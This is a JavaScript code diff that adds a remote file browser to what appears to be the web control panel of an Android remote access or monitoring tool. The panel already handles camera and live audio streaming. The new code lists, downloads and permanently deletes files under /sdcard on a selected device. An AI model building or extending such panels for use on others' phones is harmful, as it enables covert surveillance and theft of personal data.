@@ -15,6 +15,10 @@ let currentStreamObjectUrl = null;
 let currentCamObjectUrl = null;
 let sentAudioLog = [];
 
+// File browser state
+let fbCurrentPath = '';
+let fbHistory = [];
+
 // Web Audio API for live PCM streaming
 let audioCtx = null;
 let audioNextTime = 0;
@@ -282,6 +286,25 @@ function handleJsonMessage(data) {
             }
             if (data.direction === 'in') {
                 logToConsole(`Mensagem recebida do dispositivo: ${data.content}`, 'success');
+            }
+            break;
+
+        case 'FILE_LIST':
+            if (data.deviceId === currentDeviceId) fbRenderList(data);
+            break;
+        case 'FILE_LIST_ERROR':
+            if (data.deviceId === currentDeviceId) fbShowError(data.error);
+            break;
+        case 'FILE_DELETED':
+            if (data.deviceId === currentDeviceId) {
+                logToConsole(`${data.success ? '✅' : '❌'} Exclusão remota: ${data.path}`, data.success ? 'success' : 'error');
+                if (data.success) fbRefresh();
+            }
+            break;
+        case 'FILE_READY':
+            if (data.deviceId === currentDeviceId) {
+                logToConsole(`📥 Arquivo pronto para download: ${data.name}`, 'success');
+                fbShowDownloadToast(data.name, data.url, data.originalPath);
             }
             break;
 
@@ -1377,6 +1400,174 @@ function appendAiMessage(content, sender, isHtml = false) {
     
     chatContainer.appendChild(msgDiv);
     chatContainer.scrollTop = chatContainer.scrollHeight;
+}
+
+// ─── Remote File Browser ─────────────────────────────────────────────────────
+
+function fbOpen(path) {
+    if (!currentDeviceId) { logToConsole('Nenhum dispositivo selecionado!', 'error'); return; }
+    const p = path || '/sdcard';
+    fbCurrentPath = p;
+    document.getElementById('fb-loading').style.display = 'flex';
+    document.getElementById('fb-empty').style.display   = 'none';
+    document.getElementById('fb-list').style.display    = 'none';
+    sendCommand('LIST_FILES', { path: p });
+}
+
+function fbRefresh() { if (fbCurrentPath) fbOpen(fbCurrentPath); }
+
+function fbNavigateUp() {
+    if (fbHistory.length > 0) {
+        fbCurrentPath = fbHistory.pop();
+        fbOpen(fbCurrentPath);
+    }
+}
+
+function fbRenderList(data) {
+    document.getElementById('fb-loading').style.display = 'none';
+    document.getElementById('fb-empty').style.display   = 'none';
+
+    const list = document.getElementById('fb-list');
+    list.style.display = 'grid';
+    list.innerHTML = '';
+
+    // Breadcrumb
+    document.getElementById('fb-breadcrumb').textContent = data.path || '/';
+
+    // Up button
+    const upBtn = document.getElementById('fb-up-btn');
+    if (upBtn) upBtn.disabled = !data.parent || data.parent === data.path;
+
+    if (!data.files || data.files.length === 0) {
+        list.innerHTML = '<div style="color:var(--text-secondary);font-size:.85rem;padding:24px;grid-column:1/-1;text-align:center;"><i class="fa-solid fa-folder-open"></i> Pasta vazia</div>';
+        return;
+    }
+
+    data.files.forEach(f => {
+        const isDir  = f.type === 'dir';
+        const icon   = fbIcon(f.ext, isDir);
+        const size   = isDir ? '' : fbFormatSize(f.size);
+        const date   = new Date(f.modified).toLocaleDateString('pt-BR');
+
+        const div = document.createElement('div');
+        div.className = 'fb-item';
+        div.innerHTML = `
+            <span class="fb-item-icon ${fbIconClass(f.ext, isDir)}">${icon}</span>
+            <div class="fb-item-info">
+                <span class="fb-item-name" title="${escapeHtml(f.name)}">${escapeHtml(f.name)}</span>
+                <span class="fb-item-meta">${size}${size && date ? ' · ' : ''}${date}</span>
+            </div>
+            <div class="fb-item-actions">
+                ${!isDir ? `<button class="fb-act-btn dl" onclick="fbDownload('${escapeHtml(f.path)}','${escapeHtml(f.name)}')" title="Baixar"><i class="fa-solid fa-download"></i></button>` : ''}
+                <button class="fb-act-btn del" onclick="fbConfirmDelete('${escapeHtml(f.path)}','${escapeHtml(f.name)}')" title="Excluir"><i class="fa-solid fa-trash"></i></button>
+            </div>
+        `;
+
+        if (isDir) {
+            div.addEventListener('click', (e) => {
+                if (e.target.closest('.fb-item-actions')) return;
+                fbHistory.push(data.path);
+                fbOpen(f.path);
+            });
+        } else if (fbIsImage(f.ext)) {
+            div.addEventListener('click', (e) => {
+                if (e.target.closest('.fb-item-actions')) return;
+                fbDownload(f.path, f.name);
+            });
+        }
+
+        list.appendChild(div);
+    });
+}
+
+function fbShowError(msg) {
+    document.getElementById('fb-loading').style.display = 'none';
+    document.getElementById('fb-list').style.display    = 'none';
+    const empty = document.getElementById('fb-empty');
+    empty.style.display = 'flex';
+    empty.innerHTML = `<i class="fa-solid fa-triangle-exclamation fa-2x" style="color:var(--danger-red)"></i><p style="color:var(--danger-red)">${escapeHtml(msg)}</p><button class="btn btn-sm btn-primary" onclick="fbOpen()"><i class="fa-solid fa-folder-open"></i> Abrir Raiz</button>`;
+}
+
+function fbDownload(path, name) {
+    if (!currentDeviceId) return;
+    logToConsole(`⬇️ Solicitando download: ${name}`, 'system');
+    sendCommand('DOWNLOAD_FILE', { path });
+}
+
+function fbShowDownloadToast(name, url, originalPath) {
+    const toast = document.createElement('div');
+    toast.className = 'fb-download-toast';
+    toast.innerHTML = `
+        <i class="fa-solid fa-file-arrow-down" style="color:var(--neon-blue)"></i>
+        <div style="flex:1;min-width:0;">
+            <div style="font-weight:600;font-size:.85rem;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${escapeHtml(name)}</div>
+            <div style="font-size:.7rem;color:var(--text-secondary)">Arquivo disponível para download</div>
+        </div>
+        <a href="${url}" download="${escapeHtml(name)}" class="fb-act-btn dl" style="text-decoration:none;padding:6px 10px;border:1px solid var(--neon-blue);border-radius:8px;font-size:.78rem;font-weight:600;color:var(--neon-blue);">
+            <i class="fa-solid fa-download"></i> Baixar
+        </a>
+        <button onclick="this.parentElement.remove()" style="background:none;border:none;color:var(--text-secondary);cursor:pointer;font-size:1rem;padding:4px;">✕</button>
+    `;
+    document.body.appendChild(toast);
+    setTimeout(() => toast.style.opacity = '1', 10);
+    setTimeout(() => { toast.style.opacity = '0'; setTimeout(() => toast.remove(), 400); }, 15000);
+}
+
+function fbConfirmDelete(path, name) {
+    const overlay = document.createElement('div');
+    overlay.className = 'fb-confirm-overlay';
+    overlay.innerHTML = `
+        <div class="fb-confirm-box">
+            <div class="fb-confirm-icon"><i class="fa-solid fa-triangle-exclamation"></i></div>
+            <div class="fb-confirm-title">Excluir permanentemente?</div>
+            <div class="fb-confirm-path">${escapeHtml(path)}</div>
+            <div class="fb-confirm-btns">
+                <button class="fb-btn-cancel" onclick="this.closest('.fb-confirm-overlay').remove()">Cancelar</button>
+                <button class="fb-btn-delete" onclick="fbDeleteConfirmed('${escapeHtml(path)}',this)">
+                    <i class="fa-solid fa-trash"></i> Excluir
+                </button>
+            </div>
+        </div>
+    `;
+    document.body.appendChild(overlay);
+}
+
+function fbDeleteConfirmed(path, btn) {
+    btn.closest('.fb-confirm-overlay').remove();
+    sendCommand('DELETE_FILE', { path });
+    logToConsole(`🗑️ Exclusão solicitada: ${path}`, 'command');
+}
+
+// ── File browser helpers ──────────────────────────────────────────────────────
+function fbIcon(ext, isDir) {
+    if (isDir) return '📁';
+    const e = (ext || '').toLowerCase();
+    if (['jpg','jpeg','png','gif','webp','heic'].includes(e)) return '🖼️';
+    if (['mp4','mkv','avi','mov','3gp'].includes(e)) return '🎬';
+    if (['mp3','aac','ogg','flac','m4a'].includes(e)) return '🎵';
+    if (['pdf'].includes(e)) return '📄';
+    if (['doc','docx'].includes(e)) return '📝';
+    if (['xls','xlsx'].includes(e)) return '📊';
+    if (['zip','rar','7z','tar'].includes(e)) return '🗜️';
+    if (['apk'].includes(e)) return '📦';
+    return '📄';
+}
+function fbIconClass(ext, isDir) {
+    if (isDir) return 'dir';
+    const e = (ext || '').toLowerCase();
+    if (['jpg','jpeg','png','gif','webp','heic'].includes(e)) return 'img';
+    if (['mp4','mkv','avi','mov','3gp'].includes(e)) return 'vid';
+    if (['mp3','aac','ogg','flac','m4a'].includes(e)) return 'aud';
+    if (['pdf','doc','docx','xls','xlsx','txt'].includes(e)) return 'doc';
+    if (['zip','rar','7z'].includes(e)) return 'zip';
+    return 'file';
+}
+function fbIsImage(ext) { return ['jpg','jpeg','png','gif','webp'].includes((ext||'').toLowerCase()); }
+function fbFormatSize(bytes) {
+    if (bytes < 1024) return `${bytes}B`;
+    if (bytes < 1024*1024) return `${(bytes/1024).toFixed(1)}KB`;
+    if (bytes < 1024*1024*1024) return `${(bytes/1024/1024).toFixed(1)}MB`;
+    return `${(bytes/1024/1024/1024).toFixed(2)}GB`;
 }
 
 // ─── Messages Panel ───────────────────────────────────────────────────────────
